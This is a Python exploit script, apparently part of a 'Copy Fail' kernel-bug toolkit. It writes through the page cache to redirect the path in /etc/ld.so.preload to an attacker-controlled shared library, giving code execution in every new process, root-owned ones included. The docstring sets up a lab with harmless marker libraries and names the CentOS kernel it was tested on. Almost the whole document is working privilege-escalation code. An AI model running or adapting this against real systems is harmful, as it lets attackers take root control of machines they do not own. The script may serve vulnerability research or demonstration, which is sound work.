#!/usr/bin/env python3
"""
Copy Fail — /etc/ld.so.preload path hijack
============================================
Overwrites the library path in /etc/ld.so.preload to redirect the
dynamic linker to load an attacker-controlled shared library.

The evil library's constructor runs in EVERY new process (including
root-owned daemons), effectively granting code execution at the
highest available privilege level.

Prerequisite: /etc/ld.so.preload must already exist on the target
system (Copy Fail cannot create new files). Systems using it for
performance monitoring, security hooks, or library interposition
are vulnerable.

Setup for testing:
  1. Create a marker library:
     // libmarker.so
     __attribute__((constructor)) void init() {
         write(2, "[preload] marker\\n", 17);
     }
     gcc -shared -o /tmp/copyfail-lab/libmarker.so marker.c

  2. Create an "evil" library:
     // libevil00.so
     __attribute__((constructor)) void init() {
         write(2, "[preload] EVIL!\\n", 16);
     }
     gcc -shared -o /tmp/copyfail-lab/libevil00.so evil.c

  3. Set up preload (as root):
     echo /tmp/copyfail-lab/libmarker.so > /etc/ld.so.preload
     ls /dev/null  # should print "[preload] marker"

  4. Run this script to redirect preload to evil library

  5. ls /dev/null  # should print "[preload] EVIL!"

Tested on: CentOS Stream 8, kernel 4.18.0-553.6.1.el8
"""
import os
import sys
from copyfail_core import page_cache_write

PRELOAD_FILE = "/etc/ld.so.preload"
SEARCH = b"libmarker"
REPLACE = b"libevil00"


def main():
    if not os.path.isfile(PRELOAD_FILE):
        print(f"[-] {PRELOAD_FILE} does not exist")
        print("[*] This exploit requires the file to already exist on the target")
        sys.exit(1)

    with open(PRELOAD_FILE, "rb") as f:
        content = f.read()

    search = sys.argv[1].encode() if len(sys.argv) > 2 else SEARCH
    replace = sys.argv[2].encode() if len(sys.argv) > 2 else REPLACE

    offset = content.find(search)
    if offset < 0:
        print(f"[-] '{search.decode()}' not found in {PRELOAD_FILE}")
        print(f"[*] Current content: {content.strip().decode()}")
        sys.exit(1)

    if len(replace) > len(search):
        print(f"[-] Replacement must not be longer than original")
        sys.exit(1)

    # Pad replacement to match original length if shorter
    padded = replace + search[len(replace):]

    print(f"[*] Target: {PRELOAD_FILE}")
    print(f"[*] Replacing '{search.decode()}' → '{replace.decode()}' at offset {offset}")

    fd = os.open(PRELOAD_FILE, os.O_RDONLY)
    page_cache_write(fd, offset, padded)

    os.lseek(fd, 0, os.SEEK_SET)
    result = os.read(fd, len(content))
    os.close(fd)

    print(f"[*] New content: {result.strip().decode()}")
    if replace in result:
        print(f"[+] SUCCESS: preload path hijacked")
        print(f"[*] Every new process now loads the redirected library")
        print(f"[*] Restore: echo 3 > /proc/sys/vm/drop_caches")
    else:
        print(f"[-] Verification failed")


if __name__ == "__main__":
    main()
